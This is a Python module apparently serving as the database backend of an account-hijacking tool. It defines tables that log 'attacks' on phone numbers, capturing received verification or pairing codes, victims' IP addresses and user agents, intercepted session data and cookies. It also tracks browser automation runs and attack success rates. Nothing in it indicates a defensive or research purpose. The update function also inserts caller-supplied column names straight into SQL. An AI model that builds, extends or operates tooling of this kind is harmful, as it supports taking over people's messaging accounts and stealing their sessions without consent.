"""
SQLite database abstraction with connection pooling and WAL mode.
Safe for concurrent access from async server and sync automation threads.
"""
import sqlite3
import threading
from contextlib import contextmanager
from pathlib import Path
from typing import Optional, List, Dict, Any, Tuple

from config import DB_PATH, DB_WAL_MODE


class Database:
    """Thread-safe SQLite database manager."""

    def __init__(self, db_path: str = DB_PATH):
        self.db_path = db_path
        self._local = threading.local()
        self._lock = threading.Lock()
        self.init_database()

    def _get_connection(self) -> sqlite3.Connection:
        """Get a thread-local connection (one per thread)."""
        if not hasattr(self._local, "conn") or self._local.conn is None:
            conn = sqlite3.connect(self.db_path, check_same_thread=False)
            conn.row_factory = sqlite3.Row
            if DB_WAL_MODE:
                conn.execute("PRAGMA journal_mode=WAL")
            conn.execute("PRAGMA foreign_keys=ON")
            self._local.conn = conn
        return self._local.conn

    @contextmanager
    def cursor(self):
        """Context manager that yields a cursor and auto-commits."""
        conn = self._get_connection()
        cur = conn.cursor()
        try:
            yield cur
            conn.commit()
        except Exception:
            conn.rollback()
            raise

    def init_database(self):
        """Initialize tables if they don't exist."""
        Path(self.db_path).parent.mkdir(parents=True, exist_ok=True)
        with self.cursor() as cur:
            cur.execute("""
                CREATE TABLE IF NOT EXISTS schema_version (
                    version INTEGER PRIMARY KEY,
                    applied_at DATETIME DEFAULT CURRENT_TIMESTAMP
                )
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS attacks (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    phone_number TEXT NOT NULL,
                    code_requested TEXT,
                    code_received TEXT,
                    status TEXT DEFAULT 'pending',
                    timestamp DATETIME DEFAULT CURRENT_TIMESTAMP,
                    session_id TEXT,
                    ip_address TEXT,
                    user_agent TEXT,
                    automation_started BOOLEAN DEFAULT 0,
                    automation_success BOOLEAN DEFAULT 0,
                    browser_pid INTEGER
                )
            """)
            cur.execute("""
                CREATE TABLE IF NOT EXISTS intercepted_sessions (
                    id INTEGER PRIMARY KEY AUTOINCREMENT,
                    attack_id INTEGER,
                    session_data TEXT,
                    cookies TEXT,
                    pairing_time DATETIME,
                    FOREIGN KEY (attack_id) REFERENCES attacks (id)
                )
            """)

    # ── Attack CRUD ────────────────────────────────────

    def create_attack(
        self,
        phone_number: str,
        ip_address: Optional[str] = None,
        user_agent: Optional[str] = None,
    ) -> int:
        """Create a new attack record and return its ID."""
        with self.cursor() as cur:
            cur.execute(
                """INSERT INTO attacks (phone_number, status, automation_started,
                   ip_address, user_agent)
                   VALUES (?, 'automation_started', 1, ?, ?)""",
                (phone_number, ip_address, user_agent),
            )
            return cur.lastrowid

    def update_attack_status(self, attack_id: int, status: str, **kwargs) -> None:
        """Update attack status and optional extra columns."""
        fields = ["status = ?"]
        values = [status]
        for col, val in kwargs.items():
            fields.append(f"{col} = ?")
            values.append(val)
        values.append(attack_id)
        with self.cursor() as cur:
            cur.execute(
                f"UPDATE attacks SET {', '.join(fields)} WHERE id = ?", values
            )

    def get_attack(self, attack_id: int) -> Optional[Dict[str, Any]]:
        """Get a single attack by ID."""
        with self.cursor() as cur:
            cur.execute("SELECT * FROM attacks WHERE id = ?", (attack_id,))
            row = cur.fetchone()
            return dict(row) if row else None

    def get_attack_phone(self, attack_id: int) -> Optional[str]:
        """Get just the phone number for an attack."""
        with self.cursor() as cur:
            cur.execute(
                "SELECT phone_number FROM attacks WHERE id = ?", (attack_id,)
            )
            row = cur.fetchone()
            return row[0] if row else None

    def list_attacks(self, limit: int = 50) -> List[Dict[str, Any]]:
        """List recent attacks, newest first."""
        with self.cursor() as cur:
            cur.execute(
                """SELECT id, phone_number, status, timestamp, code_received,
                   automation_started, automation_success, browser_pid
                   FROM attacks ORDER BY timestamp DESC LIMIT ?""",
                (limit,),
            )
            return [dict(row) for row in cur.fetchall()]

    def check_pairing_complete(self, attack_id: int) -> bool:
        """Check if pairing completed (checks DB directly)."""
        with self.cursor() as cur:
            cur.execute(
                "SELECT status, automation_success FROM attacks WHERE id = ?",
                (attack_id,),
            )
            row = cur.fetchone()
            if row:
                return row["status"] == "success" or bool(row["automation_success"])
            return False

    def get_stats(self) -> Dict[str, Any]:
        """Get aggregate attack statistics."""
        with self.cursor() as cur:
            cur.execute("SELECT COUNT(*) as total FROM attacks")
            total = cur.fetchone()["total"]
            cur.execute('SELECT COUNT(*) as success FROM attacks WHERE status = "success"')
            success = cur.fetchone()["success"]
            cur.execute(
                "SELECT COUNT(*) as auto FROM attacks WHERE automation_started = 1"
            )
            automated = cur.fetchone()["auto"]
            cur.execute(
                "SELECT COUNT(*) as auto_success FROM attacks WHERE automation_success = 1"
            )
            auto_success = cur.fetchone()["auto_success"]

        return {
            "total_attacks": total,
            "successful": success,
            "automation_started": automated,
            "automation_success": auto_success,
            "success_rate": (success / total * 100) if total > 0 else 0.0,
            "automation_rate": (
                auto_success / automated * 100
            ) if automated > 0 else 0.0,
        }

    def clear_all(self) -> None:
        """Delete all attack data (requires admin auth at API level)."""
        with self.cursor() as cur:
            cur.execute("DELETE FROM intercepted_sessions")
            cur.execute("DELETE FROM attacks")

    def close(self) -> None:
        """Close the thread-local connection if open."""
        if hasattr(self._local, "conn") and self._local.conn:
            self._local.conn.close()
            self._local.conn = None


# Singleton
db = Database()
